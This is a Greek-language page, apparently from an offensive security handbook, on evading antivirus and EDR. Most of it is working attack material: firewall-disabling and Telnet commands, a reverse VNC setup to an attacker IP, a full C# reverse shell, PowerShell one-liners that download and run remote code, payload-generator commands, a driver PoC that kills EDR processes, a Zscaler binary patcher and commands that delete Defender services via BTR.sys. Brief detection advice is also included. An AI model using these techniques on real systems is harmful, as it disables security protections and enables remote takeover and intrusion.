Σας προτείνω θερμά να παρακολουθήσετε αυτή την ομιλία από τον [@ATTL4S](https://twitter.com/DaniLJ94), για να αποκτήσετε μια πρώτη εικόνα των πιο προηγμένων τεχνικών αποφυγής εντοπισμού.


{{#ref}}
https://vimeo.com/502507556?embedded=true&owner=32913914&source=vimeo_logo
{{#endref}}

Αυτή είναι επίσης μια εξαιρετική ομιλία από τον [@mariuszbit](https://twitter.com/mariuszbit) σχετικά με την εις βάθος αποφυγή εντοπισμού.


{{#ref}}
https://www.youtube.com/watch?v=IbA7Ung39o4
{{#endref}}

## **Παλιές Τεχνικές**

### **Έλεγχος των σημείων που το Defender εντοπίζει ως κακόβουλα**

Μπορείτε να χρησιμοποιήσετε το [**ThreatCheck**](https://github.com/rasta-mouse/ThreatCheck), το οποίο **αφαιρεί τμήματα του binary** μέχρι να **εντοπίσει ποιο τμήμα θεωρεί κακόβουλο το Defender** και να σας το απομονώσει.\
Ένα άλλο εργαλείο που κάνει **το ίδιο είναι** το [**avred**](https://github.com/dobin/avred), το οποίο προσφέρει την υπηρεσία μέσω ιστού στη διεύθυνση [**https://avred.r00ted.ch/**](https://avred.r00ted.ch/)

### **Telnet Server**

Μέχρι τα Windows 10, όλα τα Windows περιλάμβαναν έναν **Telnet server** που μπορούσατε να εγκαταστήσετε (ως διαχειριστής) εκτελώντας:

```bash
pkgmgr /iu:"TelnetServer" /quiet
```

Κάντε το να **ξεκινά** κατά την εκκίνηση του συστήματος και **εκτελέστε** το τώρα:

```bash
sc config TlntSVR start= auto obj= localsystem
```

**Αλλαγή θύρας telnet** (stealth) και απενεργοποίηση firewall:

```
tlntadmn config port=80
netsh advfirewall set allprofiles state off
```

### UltraVNC

Κατεβάστε το από: [http://www.uvnc.com/downloads/ultravnc.html](http://www.uvnc.com/downloads/ultravnc.html) (χρειάζεστε τα bin downloads, όχι το setup)

**ΣΤΟΝ HOST**: Εκτελέστε το _**winvnc.exe**_ και ρυθμίστε τον server:

- Ενεργοποιήστε την επιλογή _Disable TrayIcon_
- Ορίστε έναν κωδικό πρόσβασης στο _VNC Password_
- Ορίστε έναν κωδικό πρόσβασης στο _View-Only Password_

Έπειτα, μεταφέρετε το binary _**winvnc.exe**_ και το **νέο** αρχείο _**UltraVNC.ini**_ που δημιουργήθηκε στον **στόχο**

#### **Αντίστροφη σύνδεση**

Ο **επιτιθέμενος** πρέπει να **εκτελέσει στον** **host** του το binary `vncviewer.exe -listen 5900`, ώστε να είναι **έτοιμο** να δεχτεί μια αντίστροφη **σύνδεση VNC**. Έπειτα, στον **στόχο**: Εκκινήστε τον daemon winvnc `winvnc.exe -run` και εκτελέστε `winwnc.exe [-autoreconnect] -connect <attacker_ip>::5900`

**ΠΡΟΕΙΔΟΠΟΙΗΣΗ:** Για να διατηρήσετε τη stealth λειτουργία, μην κάνετε τα εξής:

- Μην εκκινήσετε το `winvnc` αν εκτελείται ήδη, διαφορετικά θα εμφανιστεί ένα [αναδυόμενο παράθυρο](https://i.imgur.com/1SROTTl.png). Ελέγξτε αν εκτελείται με `tasklist | findstr winvnc`
- Μην εκκινήσετε το `winvnc` χωρίς το `UltraVNC.ini` στον ίδιο φάκελο, διαφορετικά θα ανοίξει [το παράθυρο ρυθμίσεων](https://i.imgur.com/rfMQWcf.png)
- Μην εκτελέσετε το `winvnc -h` για βοήθεια, διαφορετικά θα εμφανιστεί ένα [αναδυόμενο παράθυρο](https://i.imgur.com/oc18wcu.png)

### GreatSCT

Κατεβάστε το από: [https://github.com/GreatSCT/GreatSCT](https://github.com/GreatSCT/GreatSCT)

```
git clone https://github.com/GreatSCT/GreatSCT.git
cd GreatSCT/setup/
./setup.sh
cd ..
./GreatSCT.py
```

Μέσα στο GreatSCT:

```
use 1
list #Listing available payloads
use 9 #rev_tcp.py
set lhost 10.10.14.0
sel lport 4444
generate #payload is the default name
#This will generate a meterpreter xml and a rcc file for msfconsole
```

Τώρα **εκκινήστε τον lister** με `msfconsole -r file.rc` και **εκτελέστε** το **xml payload** με:

```
C:\Windows\Microsoft.NET\Framework\v4.0.30319\msbuild.exe payload.xml
```

**Το τρέχον Defender θα τερματίσει τη διεργασία πολύ γρήγορα.**

### Μεταγλώττιση του δικού μας reverse shell

https://medium.com/@Bank_Security/undetectable-c-c-reverse-shells-fab4c0ec4f15

#### Πρώτο C# Revershell

Μεταγλωττίστε το με:

```
c:\windows\Microsoft.NET\Framework\v4.0.30319\csc.exe /t:exe /out:back2.exe C:\Users\Public\Documents\Back1.cs.txt
```

Χρησιμοποιήστε το με:

```
back.exe <ATTACKER_IP> <PORT>
```

```csharp
// From https://gist.githubusercontent.com/BankSecurity/55faad0d0c4259c623147db79b2a83cc/raw/1b6c32ef6322122a98a1912a794b48788edf6bad/Simple_Rev_Shell.cs
using System;
using System.Text;
using System.IO;
using System.Diagnostics;
using System.ComponentModel;
using System.Linq;
using System.Net;
using System.Net.Sockets;


namespace ConnectBack
{
	public class Program
	{
		static StreamWriter streamWriter;

		public static void Main(string[] args)
		{
			using(TcpClient client = new TcpClient(args[0], System.Convert.ToInt32(args[1])))
			{
				using(Stream stream = client.GetStream())
				{
					using(StreamReader rdr = new StreamReader(stream))
					{
						streamWriter = new StreamWriter(stream);

						StringBuilder strInput = new StringBuilder();

						Process p = new Process();
						p.StartInfo.FileName = "cmd.exe";
						p.StartInfo.CreateNoWindow = true;
						p.StartInfo.UseShellExecute = false;
						p.StartInfo.RedirectStandardOutput = true;
						p.StartInfo.RedirectStandardInput = true;
						p.StartInfo.RedirectStandardError = true;
						p.OutputDataReceived += new DataReceivedEventHandler(CmdOutputDataHandler);
						p.Start();
						p.BeginOutputReadLine();

						while(true)
						{
							strInput.Append(rdr.ReadLine());
							//strInput.Append("\n");
							p.StandardInput.WriteLine(strInput);
							strInput.Remove(0, strInput.Length);
						}
					}
				}
			}
		}

		private static void CmdOutputDataHandler(object sendingProcess, DataReceivedEventArgs outLine)
        {
            StringBuilder strOutput = new StringBuilder();

            if (!String.IsNullOrEmpty(outLine.Data))
            {
                try
                {
                    strOutput.Append(outLine.Data);
                    streamWriter.WriteLine(strOutput);
                    streamWriter.Flush();
                }
                catch (Exception err) { }
            }
        }

	}
}
```

### C# με χρήση compiler

```
C:\Windows\Microsoft.NET\Framework\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt.txt REV.shell.txt
```

[REV.txt: https://gist.github.com/BankSecurity/812060a13e57c815abe21ef04857b066](https://gist.github.com/BankSecurity/812060a13e57c815abe21ef04857b066)

[REV.shell: https://gist.github.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639](https://gist.github.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639)

Αυτόματη λήψη και εκτέλεση:

```csharp
64bit:
powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/812060a13e57c815abe21ef04857b066/raw/81cd8d4b15925735ea32dff1ce5967ec42618edc/REV.txt', '.\REV.txt') }" && powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639/raw/4137019e70ab93c1f993ce16ecc7d7d07aa2463f/Rev.Shell', '.\Rev.Shell') }" && C:\Windows\Microsoft.Net\Framework64\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt Rev.Shell

32bit:
powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/812060a13e57c815abe21ef04857b066/raw/81cd8d4b15925735ea32dff1ce5967ec42618edc/REV.txt', '.\REV.txt') }" && powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639/raw/4137019e70ab93c1f993ce16ecc7d7d07aa2463f/Rev.Shell', '.\Rev.Shell') }" && C:\Windows\Microsoft.Net\Framework\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt Rev.Shell
```


{{#ref}}
https://gist.github.com/BankSecurity/469ac5f9944ed1b8c39129dc0037bb8f
{{#endref}}

Λίστα obfuscators για C#: [https://github.com/NotPrab/.NET-Obfuscator](https://github.com/NotPrab/.NET-Obfuscator)

### C++

```
sudo apt-get install mingw-w64

i686-w64-mingw32-g++ prometheus.cpp -o prometheus.exe -lws2_32 -s -ffunction-sections -fdata-sections -Wno-write-strings -fno-exceptions -fmerge-all-constants -static-libstdc++ -static-libgcc
```

- [https://github.com/paranoidninja/ScriptDotSh-MalwareDevelopment/blob/master/prometheus.cpp](https://github.com/paranoidninja/ScriptDotSh-MalwareDevelopment/blob/master/prometheus.cpp)
- [https://astr0baby.wordpress.com/2013/10/17/customizing-custom-meterpreter-loader/](https://astr0baby.wordpress.com/2013/10/17/customizing-custom-meterpreter-loader/)
- [https://www.blackhat.com/docs/us-16/materials/us-16-Mittal-AMSI-How-Windows-10-Plans-To-Stop-Script-Based-Attacks-And-How-Well-It-Does-It.pdf](https://www.blackhat.com/docs/us-16/materials/us-16-Mittal-AMSI-How-Windows-10-Plans-To-Stop-Script-Based-Attacks-And-How-Well-It-Does-It.pdf)
- [https://github.com/l0ss/Grouper2](https://github.com/l0ss/Grouper2)
- [http://www.labofapenetrationtester.com/2016/05/practical-use-of-javascript-and-com-for-pentesting.html](http://www.labofapenetrationtester.com/2016/05/practical-use-of-javascript-and-com-for-pentesting.html)
- [http://niiconsulting.com/checkmate/2018/06/bypassing-detection-for-a-reverse-meterpreter-shell/](http://niiconsulting.com/checkmate/2018/06/bypassing-detection-for-a-reverse-meterpreter-shell/)

### Χρήση της python για παράδειγμα δημιουργίας injectors:

- [https://github.com/cocomelonc/peekaboo](https://github.com/cocomelonc/peekaboo)

### Άλλα εργαλεία

```bash
# Veil Framework:
https://github.com/Veil-Framework/Veil

# Shellter
https://www.shellterproject.com/download/

# Sharpshooter
# https://github.com/mdsecactivebreach/SharpShooter
# Javascript Payload Stageless:
SharpShooter.py --stageless --dotnetver 4 --payload js --output foo --rawscfile ./raw.txt --sandbox 1=contoso,2,3

# Stageless HTA Payload:
SharpShooter.py --stageless --dotnetver 2 --payload hta --output foo --rawscfile ./raw.txt --sandbox 4 --smuggle --template mcafee

# Staged VBS:
SharpShooter.py --payload vbs --delivery both --output foo --web http://www.foo.bar/shellcode.payload --dns bar.foo --shellcode --scfile ./csharpsc.txt --sandbox 1=contoso --smuggle --template mcafee --dotnetver 4

# Donut:
https://github.com/TheWover/donut

# Vulcan
https://github.com/praetorian-code/vulcan
```

### Περισσότερα

- [https://github.com/Seabreg/Xeexe-TopAntivirusEvasion](https://github.com/Seabreg/Xeexe-TopAntivirusEvasion)

## Φέρε τον δικό σου ευάλωτο driver (BYOVD) – Εξουδετέρωση AV/EDR από τον kernel

Το Storm-2603 χρησιμοποίησε ένα μικρό βοηθητικό πρόγραμμα κονσόλας, γνωστό ως **Antivirus Terminator**, για να απενεργοποιήσει τις προστασίες των endpoints πριν από την εγκατάσταση ransomware. Το εργαλείο φέρνει τον **δικό του ευάλωτο αλλά *υπογεγραμμένο* driver** και τον καταχράται για την εκτέλεση προνομιακών λειτουργιών στον kernel, τις οποίες δεν μπορούν να μπλοκάρουν ούτε οι υπηρεσίες AV που χρησιμοποιούν Protected-Process-Light (PPL).<sup>[[12]](#references)</sup>

Βασικά συμπεράσματα
1. **Υπογεγραμμένος driver**: Το αρχείο που αποθηκεύεται στον δίσκο είναι το `ServiceMouse.sys`, αλλά το binary είναι ο νόμιμα υπογεγραμμένος driver `AToolsKrnl64.sys` από το «System In-Depth Analysis Toolkit» της Antiy Labs. Επειδή ο driver φέρει έγκυρη υπογραφή της Microsoft, φορτώνεται ακόμη κι όταν είναι ενεργοποιημένο το Driver-Signature-Enforcement (DSE).
2. **Εγκατάσταση υπηρεσίας**:
   ```powershell
   sc create ServiceMouse type= kernel binPath= "C:\Windows\System32\drivers\ServiceMouse.sys"
   sc start  ServiceMouse
   ```
   Η πρώτη γραμμή καταχωρίζει το driver ως **kernel service** και η δεύτερη το εκκινεί, ώστε το `\\.\ServiceMouse` να είναι προσβάσιμο από το user land.
3. **IOCTLs που εκθέτει το driver**
   | Κωδικός IOCTL | Δυνατότητα                              |
   |-----------:|-----------------------------------------|
   | `0x99000050` | Τερματισμός οποιασδήποτε διεργασίας μέσω PID (χρησιμοποιείται για τον τερματισμό υπηρεσιών Defender/EDR) |
   | `0x990000D0` | Διαγραφή οποιουδήποτε αρχείου από τον δίσκο |
   | `0x990001D0` | Εκφόρτωση του driver και αφαίρεση της υπηρεσίας |

   Ελάχιστο C proof-of-concept:
   ```c
   #include <windows.h>
   
   int main(int argc, char **argv){
       DWORD pid = strtoul(argv[1], NULL, 10);
       HANDLE hDrv = CreateFileA("\\\\.\\ServiceMouse", GENERIC_READ|GENERIC_WRITE, 0, NULL, OPEN_EXISTING, 0, NULL);
       DeviceIoControl(hDrv, 0x99000050, &pid, sizeof(pid), NULL, 0, NULL, NULL);
       CloseHandle(hDrv);
       return 0;
   }
   ```
4. **Γιατί λειτουργεί**: Το BYOVD παρακάμπτει πλήρως τις προστασίες user-mode· ο κώδικας που εκτελείται στον kernel μπορεί να ανοίξει *προστατευμένες* διεργασίες, να τις τερματίσει ή να παραποιήσει αντικείμενα του kernel, ανεξάρτητα από τις δυνατότητες hardening PPL/PP, ELAM ή άλλες.

Εντοπισμός / Μετριασμός
•  Ενεργοποιήστε τη λίστα αποκλεισμού ευάλωτων drivers της Microsoft (`HVCI`, `Smart App Control`), ώστε τα Windows να αρνούνται τη φόρτωση του `AToolsKrnl64.sys`.
•  Παρακολουθείτε τη δημιουργία νέων υπηρεσιών *kernel* και δημιουργείτε ειδοποίηση όταν φορτώνεται driver από κατάλογο με δικαιώματα εγγραφής για όλους ή όταν δεν περιλαμβάνεται στη λίστα επιτρεπόμενων.
•  Παρακολουθείτε handles από διεργασίες user-mode προς προσαρμοσμένα device objects, ακολουθούμενα από ύποπτες κλήσεις `DeviceIoControl`.

### Παράκαμψη των ελέγχων κατάστασης συσκευής του Zscaler Client Connector μέσω επιδιόρθωσης δυαδικών αρχείων στον δίσκο

Το **Client Connector** του Zscaler εφαρμόζει τοπικά κανόνες κατάστασης συσκευής και βασίζεται στο Windows RPC για να κοινοποιεί τα αποτελέσματα σε άλλα στοιχεία. Δύο αδύναμες επιλογές σχεδιασμού καθιστούν δυνατή την πλήρη παράκαμψη:

1. Η αξιολόγηση της κατάστασης συσκευής γίνεται **εξ ολοκλήρου στην πλευρά του client** (αποστέλλεται μια boolean τιμή στον server).
2. Τα εσωτερικά RPC endpoints ελέγχουν μόνο αν το συνδεόμενο εκτελέσιμο αρχείο είναι **υπογεγραμμένο από τη Zscaler** (μέσω `WinVerifyTrust`).<sup>[[11]](#references)</sup>

Με **επιδιόρθωση τεσσάρων υπογεγραμμένων δυαδικών αρχείων στον δίσκο**, μπορούν να εξουδετερωθούν και οι δύο μηχανισμοί:

| Δυαδικό αρχείο | Αρχική λογική που επιδιορθώνεται | Αποτέλεσμα |
|--------|------------------------|---------|
| `ZSATrayManager.exe` | `devicePostureCheck() → return 0/1` | Επιστρέφει πάντα `1`, ώστε κάθε έλεγχος να θεωρείται συμμορφούμενος |
| `ZSAService.exe` | Έμμεση κλήση στο `WinVerifyTrust` | Γίνεται NOP-ed ⇒ οποιαδήποτε διεργασία (ακόμα και χωρίς υπογραφή) μπορεί να συνδεθεί στα RPC pipes |
| `ZSATrayHelper.dll` | `verifyZSAServiceFileSignature()` | Αντικαθίσταται από `mov eax,1 ; ret` |
| `ZSATunnel.exe` | Έλεγχοι ακεραιότητας στο tunnel | Παρακάμπτονται με άμεσο άλμα |

Απόσπασμα ελάχιστου patcher:

```python
pattern = bytes.fromhex("44 89 AC 24 80 02 00 00")
replacement = bytes.fromhex("C6 84 24 80 02 00 00 01")  # force result = 1

with open("ZSATrayManager.exe", "r+b") as f:
    data = f.read()
    off = data.find(pattern)
    if off == -1:
        print("pattern not found")
    else:
        f.seek(off)
        f.write(replacement)
```

Μετά την αντικατάσταση των αρχικών αρχείων και την επανεκκίνηση της στοίβας υπηρεσιών:

* **Όλοι** οι έλεγχοι posture εμφανίζονται **πράσινοι/συμμορφωμένοι**.
* Μη υπογεγραμμένα ή τροποποιημένα binaries μπορούν να ανοίξουν τα named-pipe RPC endpoints (π.χ. `\\RPC Control\\ZSATrayManager_talk_to_me`).
* Ο παραβιασμένος host αποκτά απεριόριστη πρόσβαση στο εσωτερικό δίκτυο που ορίζουν οι πολιτικές του Zscaler.

Αυτή η μελέτη περίπτωσης δείχνει πώς μπορούν να παρακαμφθούν οι αποφάσεις εμπιστοσύνης που λαμβάνονται αποκλειστικά στην πλευρά του client και οι απλοί έλεγχοι υπογραφής, με λίγες μόνο τροποποιήσεις byte.

## Κατάχρηση έμπιστης λειτουργικότητας του Microsoft Defender `BTR.sys`

Το driver **Boot-Time Removal** του Defender αποτελεί χρήσιμο αντιπαράδειγμα στο κλασικό BYOVD. Το `BTR.sys` είναι ένα νόμιμο στοιχείο αποκατάστασης, υπογεγραμμένο από τη Microsoft, χωρίς σφάλμα αλλοίωσης μνήμης και χωρίς διεπαφή IOCTL· αφού αποκτήσει πρόσβαση διαχειριστή και `SeLoadDriverPrivilege`, ένας operator μπορεί, αντί γι' αυτό, να πλαστογραφήσει την ιδιωτική συναλλαγή αποκατάστασής του και να εκτελέσει τις προβλεπόμενες λειτουργίες αρχείων/registry σε Ring-0. Πρόκειται για primitive εξουδετέρωσης AV/EDR μετά την παραβίαση, όχι για αρχική πρόσβαση ή κλιμάκωση προνομίων, ενώ ο driver μπορεί να εξαχθεί από τον πόρο `BOOTTIMETOOL` του `MpEngine.dll` του ίδιου του στόχου, αντί να εισαχθεί ένας εμφανής driver τρίτου κατασκευαστή.<sup>[[36]](#references)</sup>

### Προετοιμασία του driver μίας χρήσης

Κανονικά, το Defender αποθηκεύει τον πόρο ως αρχείο με τυχαίο όνομα `[a-z]{8}.sys` και καταχωρίζει μια υπηρεσία kernel με παρόμοιο όνομα. Το `DriverEntry` διαβάζει την τιμή `Args` της υπηρεσίας, ανοίγει το αναφερόμενο NTFS ADS, αποκρυπτογραφεί και επικυρώνει τη λίστα ενεργειών, γράφει feedback και επιστρέφει `0xC0000056` (`STATUS_DELETE_PENDING`) μετά την επιτυχή εκτέλεση, ώστε να γίνει unload του driver αντί να παραμείνει φορτωμένος. Μια πλαστογραφημένη υπηρεσία έχει τις ακόλουθες χαρακτηριστικές τιμές.<sup>[[36]](#references)[[37]](#references)</sup>

```text
Type         = 1
Start        = 1
ErrorControl = 0
ImagePath    = \??\C:\Windows\System32\drivers\<random>.sys
Group        = Boot Bus Extender
Args         = C:\Windows\System32\drivers\<random>.sys:changelist
```

Το stream `:changelist` περιέχει ένα blob κρυπτογραφημένο με RC4. Τα builds που αναλύθηκαν χρησιμοποιούν ξανά ένα σταθερό κλειδί 256 byte, επομένως η κρυπτογράφηση δεν αποτελεί όριο εξουσιοδότησης. Ένα έγκυρο plaintext έχει μια καθολική κεφαλίδα 24 byte (`Magic=0xFEE1DEAD`, `Version=2`, `PayloadOffset=0x10`, CRC κεφαλίδας και ένα transaction ID που προκύπτει από το payload), ακολουθούμενη από ένα null-terminated UTF-16 feedback path και οποιονδήποτε αριθμό στοιχείων. Κάθε στοιχείο έχει κεφαλίδα 16 byte (`DataSize`, `Action`, `HeaderCRC`, `DataCRC`) και δεδομένα ειδικά για την ενέργεια, που τελειώνουν με **ακριβώς τέσσερα NUL bytes**. Κάθε περιοχή κεφαλίδας/δεδομένων ελέγχεται ανεξάρτητα με CRC-32 πολυωνύμου `0xEDB88320`, αρχική κατάσταση `0xFFFFFFFF` και **χωρίς τελικό XOR** (`~CRC32`)· η κατάσταση CRC μηδενίζεται για κάθε περιοχή.<sup>[[36]](#references)[[37]](#references)</sup>

Τα αποδεκτά action IDs αποκαλύπτουν αυτές τις primitive λειτουργίες του kernel.<sup>[[36]](#references)[[37]](#references)</sup>

| ID | Δεδομένα στοιχείου | Αποτέλεσμα |
| --- | --- | --- |
| 1 | `[UTF-16 path]` | Διαγραφή αρχείου, ακόμη και αν είναι κλειδωμένο |
| 2 | `[UTF-16 path]` | Αφαίρεση κενού καταλόγου |
| 3 | `[Flags][source][destination]` | Μετακίνηση αρχείου σε προστατευμένο path που επιλέγει ο attacker· κενός προορισμός σημαίνει διαγραφή |
| 4 | `[Flags][key path]` | Αναδρομική διαγραφή κλειδιού registry |
| 5 | `[Flags][key path + "\\" + value]` | Διαγραφή τιμής registry |
| 6 | `[Flags][type][size][key path + "\\" + value][data]` | Δημιουργία/ενημέρωση τιμής registry και δημιουργία τυχόν ελλειπουσών διαδρομών κλειδιών |

Για τις ενέργειες 5 και 6, το διαχωριστικό key/value στο on-wire format είναι **δύο διαδοχικά backslash**· ένα path με τη συνήθη μορφοποίηση δεν θα διαχωριστεί σωστά. Το feedback file αντικατοπτρίζει σε μεγάλο βαθμό το αίτημα, αλλά τα πρώτα τέσσερα byte δεδομένων κάθε στοιχείου γίνονται το `NTSTATUS` που προκύπτει. Για τις ενέργειες 1 και 2, οι οποίες δεν έχουν αρχικό πεδίο flags, το BTR μετακινεί το path στα τέσσερα δεσμευμένα bytes στο τέλος, ώστε να δημιουργηθεί χώρος για αυτή την κατάσταση.<sup>[[36]](#references)</sup>

### Ροή εργασίας `BTR_CLI` και παράθυρο early-boot

Το [`BTR_CLI`](https://github.com/Dump-GUY/BTR_CLI) υλοποιεί ολόκληρη την αλυσίδα: εξαγωγή του `BTR.sys` από το τοπικό Defender, δημιουργία των `<random>.sys:changelist` και ενός feedback stream, σειριοποίηση/υπολογισμός checksum/κρυπτογράφηση αλυσιδωτών ενεργειών, άμεση δημιουργία του κλειδιού registry της υπηρεσίας και, στη συνέχεια, κλήση του `NtLoadDriver` για `-trigger now` ή διατήρησή του ως system-start driver για `-trigger boot`. Η άμεση προετοιμασία του registry παρακάμπτει τη συνηθισμένη διαδρομή `CreateServiceW` του SCM και, επομένως, **δεν** δημιουργεί το Event ID 7045 για εγκατάσταση υπηρεσίας. Τα artifacts που ενεργοποιούνται κατά την εκκίνηση μπορούν αργότερα να αφαιρεθούν με `BTR_CLI.exe -cleanup <service_name>`.<sup>[[36]](#references)[[37]](#references)</sup>

```powershell
# Runtime: remove protected security-service registrations from Ring 0
BTR_CLI.exe -chain -item "4|HKLM\SYSTEM\CurrentControlSet\Services\WdFilter" -item "4|HKLM\SYSTEM\CurrentControlSet\Services\WinDefend" -trigger now

# Boot: delete a security driver before its user-mode protection stack starts
BTR_CLI.exe -a 1 -s "C:\Windows\System32\drivers\wd\WdFilter.sys" -trigger boot
```

`Start=0` δεν είναι αξιοποιήσιμο, επειδή το BTR εκτελεί I/O αρχείων από το `DriverEntry` πριν να είναι έτοιμα το storage stack και το link `SystemRoot`. Το `Start=1` μαζί με την ομάδα υψηλής προτεραιότητας `Boot Bus Extender` εκτελείται αντίθετα στη Phase 1: το NTFS είναι διαθέσιμο, αλλά πολλά security drivers που ξεκινούν από το σύστημα και user-mode EDR services δεν έχουν αρχικοποιηθεί. Boot-start filters όπως το `WdFilter` μπορεί να έχουν ήδη φορτωθεί, αλλά το BTR μπορεί να αφαιρέσει τα binaries τους ή τη ρύθμιση των services πριν από την επόμενη εκκίνηση, και μπορεί να διαγράψει τα εκτελέσιμα των services πριν τα εκκινήσει το SCM. Το ELAM δεν κλείνει αυτό το κενό, επειδή το BTR εκτελείται μετά την αξιολόγηση του boot-start και φέρει έγκυρη υπογραφή Microsoft.<sup>[[36]](#references)</sup>

Πολλαπλές ενέργειες εκτελούνται σε μία συναλλαγή. Το PoC τοποθετεί ως Action 1 το προκαθορισμένο `\SystemRoot\Temp\BootClean.log`: το BTR δημιουργεί αυτό το log, έπειτα εκτελεί το δικό του αίτημα διαγραφής και το αφαιρεί πριν από την αποφόρτωσή του. Έτσι μειώνονται τα ίχνη, ενώ η τοποθέτηση των στοιχείων ανατροφοδότησης στο `<random>.sys:<random>.dat` επιτρέπει την ταυτόχρονη αφαίρεση του driver και των δύο streams.<sup>[[36]](#references)[[37]](#references)</sup>

### Συσχετίσεις ανίχνευσης υψηλής πιστότητας

Οι κανόνες που βασίζονται μόνο σε υπογραφές και η λίστα αποκλεισμού ευάλωτων drivers της Microsoft δεν αντιμετωπίζουν την κατάχρηση της προβλεπόμενης λειτουργικότητας του BTR. Προτιμήστε αυτές τις συμπεριφορικές συσχετίσεις, διακρίνοντας παράλληλα τη νόμιμη προέλευση από το Defender από έναν αυθαίρετο launcher.<sup>[[36]](#references)</sup>

- **Sysmon 15:** Η δημιουργία του `.sys:changelist` είναι καθολική στο staging του BTR. Ένα ADS `.dat` συνδεδεμένο στο ίδιο `.sys` είναι ιδιαίτερα ύποπτο, επειδή το νόμιμο Defender συνήθως τοποθετεί τα στοιχεία ανατροφοδότησης κάτω από το `C:\ProgramData\Microsoft\Windows Defender\Scans\RebootActions\`.
- **Sysmon 12/13 χωρίς System 7045:** συσχετίστε την άμεση δημιουργία του `HKLM\SYSTEM\CurrentControlSet\Services\<random>`, που περιέχει `Args=...:changelist` και `Group=Boot Bus Extender`, χωρίς αντίστοιχο συμβάν εγκατάστασης SCM.
- **Sysmon 6 -> 23:** συσχετίστε τη φόρτωση γνωστού BTR driver από προέλευση που δεν σχετίζεται με το Defender με επακόλουθη διαγραφή αρχείων από το `System`/PID 4, ιδίως για security binaries.
- **Sysmon 11 -> 23:** δημιουργήστε alert για την ταχεία δημιουργία και διαγραφή του `\SystemRoot\Temp\BootClean.log` από το `System`/PID 4.
- Περιορίστε και ελέγξτε την εκχώρηση/ενεργοποίηση του `SeLoadDriverPrivilege`. Η υπογραφή Microsoft από μόνη της δεν αποτελεί επαρκή λόγο εμπιστοσύνης όταν ένας driver εργαλείου ασφαλείας γίνεται stage από `cmd.exe`, PowerShell ή άγνωστη διεργασία.

## Κατάχρηση του Protected Process Light (PPL) για αλλοίωση AV/EDR με LOLBINs

Το Protected Process Light (PPL) επιβάλλει μια ιεραρχία signer/level, ώστε μόνο διεργασίες ίδιου ή υψηλότερου επιπέδου προστασίας να μπορούν να αλλοιώσουν η μία την άλλη. Επιθετικά, αν μπορείτε να εκκινήσετε νόμιμα ένα binary με ενεργοποιημένο PPL και να ελέγξετε τα ορίσματά του, μπορείτε να μετατρέψετε καλοήθη λειτουργικότητα (π.χ. logging) σε έναν περιορισμένο μηχανισμό εγγραφής, υποστηριζόμενο από PPL, ενάντια σε προστατευμένους καταλόγους που χρησιμοποιούνται από AV/EDR.<sup>[[16]](#references)[[17]](#references)[[18]](#references)[[19]](#references)[[20]](#references)</sup>

Τι χρειάζεται για να εκτελείται μια διεργασία ως PPL
- Το target EXE (και κάθε DLL που φορτώνεται) πρέπει να είναι υπογεγραμμένο με EKU συμβατό με PPL.
- Η διεργασία πρέπει να δημιουργηθεί με CreateProcess χρησιμοποιώντας τα flags: `EXTENDED_STARTUPINFO_PRESENT | CREATE_PROTECTED_PROCESS`.
- Πρέπει να ζητηθεί συμβατό επίπεδο προστασίας που να αντιστοιχεί στον signer του binary (π.χ. `PROTECTION_LEVEL_ANTIMALWARE_LIGHT` για anti-malware signers, `PROTECTION_LEVEL_WINDOWS` για Windows signers). Λανθασμένα επίπεδα θα αποτύχουν κατά τη δημιουργία.

Δείτε επίσης εδώ μια ευρύτερη εισαγωγή στα PP/PPL και την προστασία του LSASS:

{{#ref}}
stealing-credentials/credentials-protections.md
{{#endref}}

Εργαλεία launcher
- Βοηθητικό εργαλείο ανοικτού κώδικα: CreateProcessAsPPL (επιλέγει επίπεδο προστασίας και προωθεί ορίσματα στο target EXE):
  - [https://github.com/2x7EQ13/CreateProcessAsPPL](https://github.com/2x7EQ13/CreateProcessAsPPL)<sup>[[19]](#references)</sup>
- Μοτίβο χρήσης:

```text
CreateProcessAsPPL.exe <level 0..4> <path-to-ppl-capable-exe> [args...]
# example: spawn a Windows-signed component at PPL level 1 (Windows)
CreateProcessAsPPL.exe 1 C:\Windows\System32\ClipUp.exe <args>
# example: spawn an anti-malware signed component at level 3
CreateProcessAsPPL.exe 3 <anti-malware-signed-exe> <args>
```

LOLBIN primitive: ClipUp.exe
- Το υπογεγραμμένο system binary `C:\Windows\System32\ClipUp.exe` εκκινεί ξανά από μόνο του και δέχεται παράμετρο για εγγραφή ενός log file σε διαδρομή που ορίζει ο caller.
- Όταν εκτελείται ως διεργασία PPL, η εγγραφή του αρχείου γίνεται με προστασία PPL.
- Το ClipUp δεν μπορεί να αναλύσει διαδρομές που περιέχουν κενά· χρησιμοποιήστε σύντομες διαδρομές 8.3 για να δείξετε σε κανονικά προστατευμένες τοποθεσίες.

Βοηθητικά εργαλεία σύντομων διαδρομών 8.3
- Εμφάνιση σύντομων ονομάτων: `dir /x` σε κάθε γονικό κατάλογο.
- Εύρεση σύντομης διαδρομής σε cmd: `for %A in ("C:\ProgramData\Microsoft\Windows Defender\Platform") do @echo %~sA`

Αλυσίδα κατάχρησης (αφηρημένη)
1) Εκκινήστε το PPL-capable LOLBIN (ClipUp) με `CREATE_PROTECTED_PROCESS` χρησιμοποιώντας έναν launcher (π.χ. CreateProcessAsPPL).
2) Περάστε το όρισμα διαδρομής log του ClipUp για να επιβάλετε τη δημιουργία αρχείου σε προστατευμένο κατάλογο AV (π.χ. Defender Platform). Χρησιμοποιήστε σύντομα ονόματα 8.3, αν χρειάζεται.
3) Αν το AV έχει συνήθως ανοιχτό/κλειδωμένο το binary-στόχο όσο εκτελείται (π.χ. MsMpEng.exe), προγραμματίστε την εγγραφή κατά την εκκίνηση, πριν ξεκινήσει το AV, εγκαθιστώντας μια υπηρεσία auto-start που εκτελείται αξιόπιστα νωρίτερα. Επαληθεύστε τη σειρά εκκίνησης με το Process Monitor (boot logging).
